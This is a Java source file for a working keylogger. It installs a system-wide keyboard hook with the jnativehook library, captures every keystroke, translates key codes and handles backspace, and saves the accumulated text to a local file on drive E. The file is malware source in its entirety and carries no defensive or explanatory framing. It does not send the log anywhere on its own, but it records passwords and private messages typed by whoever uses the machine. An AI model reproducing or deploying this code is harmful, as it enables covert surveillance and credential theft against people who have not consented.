import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;


public class KeyLogger implements NativeKeyListener {
    public String line = "";
    KeyboardList keyboardList = new KeyboardList();
    public int rawCode;
    public Path fileName = Path.of("E:\\files.txt");
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        saveLastText();
        rawCode = e.getRawCode();
//        isActivateShift is true -> when the SHIFT button is pressed
        if (rawCode == 160 || rawCode == 161) {//SHIFT-LEFT = 160 // SHIFT-RIGHT =161
            KeyboardList.isActivateShift = true;
        }
        handleKeyPress(rawCode);
    }
    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        int keyCode = e.getKeyCode();
//      isActivateShift is false -> SHIFT button has been released
        if (keyCode == NativeKeyEvent.VC_SHIFT) {
            KeyboardList.isActivateShift = false;
        }
    }
    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {}

    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (Exception e) {
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(new KeyLogger());
    }
    public void handleKeyPress(int keyCode) {
        if(keyCode==8){
            backspaceKey();
        }else {
            addKey(keyCode);
        }
    }
    public void saveLastText(){
//        the last data will be saved in the file "files.txt"
        try {
            line = Files.readString(fileName);
        } catch (IOException ex) {
            throw new RuntimeException(ex);
        }
    }
    public void addKey(int keyCode) {
        keyboardList.setKeyCode(keyCode);
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(fileName.toFile()))) {
            String keyText1 = keyboardList.getKeyCode();
            line += keyText1;
            writer.write(line);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public void backspaceKey() {
//        delete the last char from the string
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(fileName.toFile()))) {
            StringBuilder sb = new StringBuilder(line);
            sb.deleteCharAt(line.length() - 1);
            line = sb.toString();
            writer.write(line);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}